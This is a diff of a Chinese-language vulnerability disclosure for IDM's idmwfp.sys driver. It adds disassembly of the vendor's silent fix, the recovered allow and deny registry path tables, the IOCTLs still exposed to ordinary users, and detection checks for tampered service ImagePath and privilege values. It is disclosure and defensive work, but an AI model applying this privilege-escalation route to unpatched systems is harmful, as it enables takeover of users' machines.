+| 跨权限边界 | 是。可访问其他用户 SID 的 hive 与安全产品配置 |
 
 ---
 
-## 10. 根因总结
+## 7. 厂商响应与修复状态
 
-漏洞成立需要两个条件同时满足，而该驱动两者全部满足：
+厂商未发布安全公告，也未就本报告作出回应。截至本文写作时，公开更新日志中没有任何一条提到驱动安全问题。
 
-1. 设备对象对所有认证用户开放  
-2. IOCTL 中对高权限注册表路径的操作没有授权和命名空间限制
+受影响范围至 6.42 Build 63。厂商在尝试联系后静默进行了修复：IDM 6.43 Build 5 分发的 `idmwfp64.sys` 6.43.1.91 中，对应 `sub_140005B90` 的函数位于 `0x1400065B0`，入口处多了一次特权字符串块解码，随后在注册表操作之前对路径做模式匹配：
 
-本质上，这是一个：
+```text
+0x140006643  call 0x140005620            ; 解码特权字符串块
+0x140006885  加载允许/根模式表，长度 0x6E WCHAR
+0x1400068BD  对解码后的输入路径调用模式匹配
+0x1400068C9  无匹配则返回 STATUS_OBJECT_PATH_INVALID
+0x140006913  加载拒绝组件模式表，长度 0x6B WCHAR
+0x14000694B  对路径组件调用模式匹配
+0x140006A5B  组件被命中或切分非法则返回 STATUS_OBJECT_NAME_INVALID
+```
 
-- “低权限用户可调用的内核代理注册表接口”
+还原出的两张策略表：
 
-而不是一个：
+```text
+允许的根：
+  SOFTWARE\Internet Download Manager\*
+  SOFTWARE\WOW6432Node\Internet Download Manager\*
+  SOFTWARE\Classes\CLSID\*
 
-- “仅服务 IDM 自身配置的受限接口”
+拒绝的路径组件：
+  AppID
+  *ProgID
+  InprocServer*
+  LocalServer*
+  InprocHandler*
+  PersistentHandler*
+  TypeLib
+  TreatAs
+  DefaultExtension
+```
 
----
-
-## 11. 安全建议
-
-至少应修复以下问题：
-
-### 11.1 收紧设备 ACL
-
-不应使用：
-
-- `D:P(A;;GA;;;AU)`
-
-建议仅允许：
-
-- 管理员
-- `SYSTEM`
-- IDM 自有服务 SID
-
-### 11.2 对路径做白名单约束
-
-`subcmd 0x0C..0x0F` 应强制限制到 IDM 自身命名空间，例如：
-
-- `HKLM\SOFTWARE\Wow6432Node\Internet Download Manager\...`
-- 或厂商明确允许的极小集合
-
-绝不应允许调用者传任意相对路径。
-
-### 11.3 增加调用者授权校验
-
-即使路径在允许范围内，也应验证：
-
-- 调用者 SID / Token
-- 是否为受信任服务
-- 是否具有管理员权限
-
-### 11.4 禁止普通用户访问 `HKLM` / `HKU` 泛化根
-
-尤其不应让普通用户通过内核代理绕过正常 ACL。
+就本漏洞的直接利用路径而言这个修复是有效的（`HKLM\SYSTEM\CurrentControlSet\Services\...` 不匹配允许表），但它把设备接口继续留给所有已认证用户，设备上其余 IOCTL（跨 PID 策略下发、事件绑定、通知队列读取、WFP filter 删除等）的暴露面并未收窄，这些接口自身也不带调用者校验。
 
 ---
 
-## 12. 结论
+## 8. 检测与排查
 
-这是一个高危内核驱动逻辑漏洞。  
-`idmwfp.sys` 通过对所有认证用户开放的 IOCTL 接口，向低权限用户暴露了一个可操作 `HKLM` 和 `HKU` 任意路径的内核注册表读写能力。
+本漏洞的利用在注册表层面会留下痕迹，可重点核对：
 
-这类能力本身就足以被视为：
-
-- 安全边界破坏
-- 高危本地提权原语
-- 高权限持久化原语
-
-从防守角度看，这不应被降级为“仅配置问题”或“仅产品内私有接口误用”，因为：
-
-- 受影响命名空间不是 IDM 私有路径
-- 实际操作对象是系统级高价值注册表根
-- 普通用户已经可以稳定复现
-
-因此建议厂商尽快修复，并建议将其作为一例**内核驱动导致的本地提权/任意注册表读写漏洞**进行处理。
-
----
-
-## 13. 附件与材料
-
-本地已准备：
-
-- 综合协议说明  
-  - [idmwfp_ioctl_protocol.md](</c:/Users/KnCRJVirX/Desktop/IDM/idmwfp_ioctl_protocol.md>)
-
-- 综合审计报告  
-  - [idmwfp_audit_report.md](</c:/Users/KnCRJVirX/Desktop/IDM/idmwfp_audit_report.md>)
-
-- 注册表专项 PoC  
-  - [idmwfp_reg_demo.cpp](</c:/Users/KnCRJVirX/Desktop/IDM/idmwfp_reg_demo.cpp>)
-  - [idmwfp_reg_demo.exe](</c:/Users/KnCRJVirX/Desktop/IDM/idmwfp_reg_demo.exe>)
-
-- 主控制面 PoC  
-  - [idmwfp_demo.cpp](</c:/Users/KnCRJVirX/Desktop/IDM/idmwfp_demo.cpp>)
-  - [idmwfp_demo.exe](</c:/Users/KnCRJVirX/Desktop/IDM/idmwfp_demo.exe>)
-
+- `HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath` 是否指向非 `%SystemRoot%` 路径，或指向用户可写目录；
+- `RequiredPrivileges` 是否包含 `SeTcbPrivilege` 之外的大量特权，尤其是 `SeDebugPrivilege`、`SeLoadDriverPrivilege`、`SeBackupPrivilege`、`SeRestorePrivilege` 同时出现；
+- 系统日志中服务安装/配置变更事件（4697、7040、7045）与 `Microsoft-Windows-Kernel-...` 无关的注册表写入之间是否存在时间对应。
